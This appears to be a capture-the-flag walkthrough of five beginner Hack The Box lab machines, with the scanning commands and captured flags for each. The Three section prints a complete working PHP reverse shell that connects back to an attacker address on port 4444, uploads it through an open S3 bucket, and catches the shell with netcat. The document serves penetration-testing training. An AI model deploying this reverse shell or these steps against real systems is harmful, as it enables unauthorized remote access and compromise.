# TIER 0 STARTING POINT

--------------------------------------------------------------------

**TOOLS USED**: nmap, gobuster, smbclient, telnet, ftp, redis, awscli, nc

--------------------------------------------------------------------

## MEOW BOX

**IP Address**: 10.129.70.43

```
nmap -sC -sV -oN nmap.txt 10.129.70.43
```

**EXPOSED PORT (SERVICE)**: 21 (ftp)

```
telnet 10.129.70.43
```

user: root

FLAG: b40abdfe23665f766f9c61ecba8a4c19

--------------------------------------------------------------------

## FAWN BOX

**IP Address**: 10.129.98.220

```
nmap -sC -sV -oN nmap.txt 10.129.98.220
```
**EXPOSED PORT (SERVICE)**: 21 (ftp)

Anonymous ftp login was enabled

```
ftp 10.129.98.220
```

user: anonymous<br>
password: anonymous<br>

```
get flag.txt
```

FLAG: 035db21c881520061c53e0536e44f815

--------------------------------------------------------------------

## DANCING BOX

**IP Address**: 10.129.142.29

```
nmap -sC -sV -oN dancing_nmap.txt 10.129.142.29
```

**EXPOSED PORT (SERVICE)**:<br>
135 (msrpc),<br>
139 (netbios-ssn),<br>
445 (microsoft-ds)

To list the smb shares:

```
smbclient -L 10.129.142.29
```

Shares: ADMIN$, C$, IPC$, WorkShares

WorkShares doesn't require a password. Other ones are default shares ($)

```
smbclient //10.129.142.29/WorkShares
get flag.txt
```

FLAG: 5f61c10dffbc77a704d76016a22f1664

--------------------------------------------------------------------

## REDEEMER BOX

**IP Address**: 10.129.34.251

-p-: all ports
-T5: speed up scan because -p- is slow (T0 slowest but most evasive, T5 quickest but aggressive)
```
nmap -sC -p- -T5 -oN redeemer_nmap.txt 10.129.34.251
```

**EXPOSED PORT (SERVICE)**: 6379 (redis)

Redis: in-memory database

```
redis-cli -h 10.129.34.251
INFO SERVER
INFO KEYSPACE
SELECT 0
KEYS *
GET FLAG
```

FLAG: 03e1d2b376c37ab3f5319922053953eb"

--------------------------------------------------------------------

## THREE BOX

**IP Address**: 10.129.57.21

-p-: all ports<br>
-sC script scan<br>
-sV version info<br>
-oN OUTPUT_FILE
```
nmap -sC -sV -p- -oN three_nmap.txt 10.129.57.21
```

**EXPOSED PORT (SERVICE)**: 22 (ssh), 80 (http)

found email on website: mail@thetoppers.htb

add new domain to /etc/hosts
```
10.129.57.21 thetoppers.htb
```

Go to http://thetoppers.htb

Get subdomain list
```
git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists
# or sudo apt install seclists
```

Find subdomains<br>
vhost = subdomains
```
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**SUBDOMAINS**: s3.thetoppers.htb, gc._msdcs.thetoppers.htb

s3.thetoppers.htb is running amazon s3<br>
status: running

Use awscli to interact with this subdomain
```
aws configure # Setup awscli
aws --endpoint=http://s3.thetoppers.htb s3 ls # List all s3 buckets
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb # List contents of s3 bucket
```

Contents: /images, .htaccess, index.php

Create shell.php (from https://www.revshells.com/)
```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.49';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Upload to aws s3 and start listener
```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
nc -lnvp 4444
```

go to http://thetoppers.htb/shell.php

```
find / -iname *flag*
cat /var/www/flag.txt
```

FLAG: a980d99281a28d638ac68b9bf9453c2b
